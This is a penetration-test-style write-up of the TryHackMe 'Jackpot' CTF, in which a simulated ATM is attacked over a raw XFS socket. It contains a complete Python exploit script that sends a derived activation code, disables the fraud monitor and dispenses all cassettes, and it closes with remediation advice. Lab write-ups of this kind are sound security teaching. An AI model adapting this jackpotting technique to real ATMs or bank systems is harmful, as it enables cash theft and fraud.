# Penetration Testing Report: Jackpot CTF

**Target IP:** `10.114.144.230`  
**Challenge Name:** Jackpot (TryHackMe)  
**Date:** October 20, 2026  
**Author:** Security Analyst / Student

---

## 1. Executive Summary

An assessment was performed against an isolated branch ATM terminal simulation ("Earth's National Bank — Terminal 004") to evaluate its resilience against logical access attacks.

The machine exposed a hardware bridge service on port `9100` and an engineering web console on port `8080`. Through web reconnaissance, reverse engineering of the local service binary, and custom TCP socket packet manipulation, control over the simulated cash dispensing unit was achieved, resulting in the simulated cash-out of all cassettes and retrieval of the challenge flag.

---

## 2. Reconnaissance & Service Enumeration

An initial `nmap` port scan revealed the following services:

- **Port 22/tcp (SSH):** OpenSSH 9.6p1.
- **Port 8080/tcp (HTTP):** BaseHTTPServer running the Earth's National Bank Engineering Console.
- **Port 9100/tcp (Raw Socket):** Hardware bridge service communicating via the CEN/XFS (eXtensions for Financial Services) standard protocol.

### Discovery Details

- **Web Console (Port 8080):** Displayed live terminal status, cassette bill counts, a dynamically changing session nonce, and a downloadable service binary (`/jackpot`).
- **Hardware Interface (Port 9100):** Accepted raw binary requests following this framing format:

$$
\text{Request Format} =
\text{[1B msg\_type]} +
\text{[4B Big-Endian command\_id]} +
\text{[2B Big-Endian length]} +
\text{[Data Payload]}
$$

---

## 3. Vulnerability Analysis & Exploitation Methodology

### Step 1: Extracting the Session Nonce

Querying the web console's status endpoint (`/status`) revealed the active session nonce required for administrative actions.

Example response:

```json
{
  "nonce": "531505",
  "armed": false,
  "monitor_on": true,
  "locked": false
}
```

### Step 2: Deriving the Supervisor Activation Code

The downloaded engineering binary (`jackpot`) accepts the live session nonce and derives a supervisor activation code.

Example command and output:

```bash
$ ./jackpot 531505
[*] session nonce : 531505
[*] activation code: 03865900
```

### Step 3: Communicating with the XFS Bridge Protocol

Using a Python script to interact with port `9100`, the following operational sequence was performed in the authorized CTF environment:

1. **Arm Supervisor Mode (`EXECUTE 0x4f0`):** Sent the derived activation code.
2. **Disable Fraud Monitor (`EXECUTE 0x4f1`):** Sent `"off"` to disable the simulated fraud monitor.
3. **Query Cassette Status (`GETINFO 0x0303`):** Retrieved inventory levels across cassettes `CST1`, `CST2`, `CST3`, and `CST4`.
4. **Dispense Cash (`EXECUTE 0x401`):** Issued simulated dispense commands in chunks of up to 40 notes.
5. **Retrieve Flag (`GETINFO 0x04ff`):** Queried the terminal for the challenge completion token.

---

## 4. Exploit Script Implementation

The following Python script documents the protocol interaction used in the assessment.

```python
import socket
import struct
import json

HOST = "10.114.144.230"
PORT = 9100

MSG_TYPES = {
    "GETINFO": 0x01,
    "EXECUTE": 0x02
}

def send_cmd(msg_type_name, command_id, data=""):
    if isinstance(data, str):
        data = data.encode("utf-8")

    s = socket.create_connection((HOST, PORT), timeout=5)

    # Read and discard the connection banner
    banner_len_bytes = s.recv(2)

    if banner_len_bytes:
        banner_len = struct.unpack(">H", banner_len_bytes)[0]
        s.recv(banner_len)

    # Header:
    # 1 byte message type
    # 4 bytes command ID (big-endian)
    # 2 bytes payload length (big-endian)
    header = struct.pack(
        ">BIH",
        MSG_TYPES[msg_type_name],
        command_id,
        len(data)
    )

    packet = header + data
    s.sendall(packet)

    resp_len_bytes = s.recv(2)

    if not resp_len_bytes:
        s.close()
        return {}

    resp_len = struct.unpack(">H", resp_len_bytes)[0]
    response_data = s.recv(resp_len)

    s.close()

    return json.loads(response_data.decode("utf-8"))


# 1. Arm Supervisor Mode
print("[+] Arming supervisor mode")
print("Response:", send_cmd("EXECUTE", 0x4f0, "03865900"))

# 2. Disable Fraud Monitor
print("[+] Disabling fraud monitor")
print("Response:", send_cmd("EXECUTE", 0x4f1, "off"))

# 3. Fetch Cassette Status
print("[+] Fetching cassette status")
status = send_cmd("GETINFO", 0x0303)

for cst in status.get("cassettes", []):
    cst_id = cst["id"]
    count = cst["count"]

    print(f"[+] Cassette {cst_id}: {count} notes")

    while count > 0:
        chunk = min(40, count)

        payload = json.dumps({
            "cassette": cst_id,
            "count": chunk
        })

        send_cmd("EXECUTE", 0x401, payload)
        count -= chunk

# 4. Retrieve the CTF Flag
print("[+] Checking for flag")
flag_resp = send_cmd("GETINFO", 0x04ff)

print("Flag Response:", flag_resp)
```

**Implementation note:** The script above reproduces the supplied example. It assumes each socket read returns the requested number of bytes, which TCP does not guarantee. A production-quality protocol client should use a `recv_exact()` helper and verify command responses before continuing.

---

## 5. Results & Flag

According to the supplied challenge results, the simulated dispenser cassettes were emptied, triggering the hardware controller's challenge completion condition.

**Captured Flag:**

```text
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

---

## 6. Recommendations & Remediation

### 6.1 Network Segmentation and Firewalling

Maintenance interfaces, including port `9100` and engineering web servers on port `8080`, should not be directly accessible from untrusted networks. Restrict access to authorized management hosts and dedicated management VLANs.

### 6.2 Strong Authentication and Encryption

Implement mutual TLS (mTLS), strong authentication, and cryptographic challenge-response mechanisms for hardware bridge communications. Validate authorization for every sensitive command rather than relying only on a derived activation code.

### 6.3 Digital Signing of Maintenance Tools

Require digital signatures for maintenance binaries and verify their integrity before execution. Restrict which clients and services can communicate with low-level peripheral controllers.

### 6.4 Least Privilege and Command Authorization

Separate monitoring privileges from cash-dispensing privileges. Require explicit authorization for sensitive operations and prevent unauthenticated clients from disabling fraud monitoring or issuing dispense commands.

### 6.5 Logging and Monitoring

Log authentication attempts, supervisor-mode activation, fraud-monitor changes, dispense requests, and abnormal cassette activity. Alert on unusual transaction volumes and repeated command failures.

---

## 7. Conclusion

The Jackpot CTF assessment demonstrates how insufficiently protected maintenance interfaces and weak command authorization can expose critical operations to unauthorized control.

The key security lessons are to enforce strong authentication, validate every sensitive command, isolate hardware management interfaces, and monitor abnormal activity.

**Assessment scope:** This report describes the supplied results for the authorized Jackpot CTF lab. Findings should be independently verified before being treated as confirmed vulnerabilities in a real system.
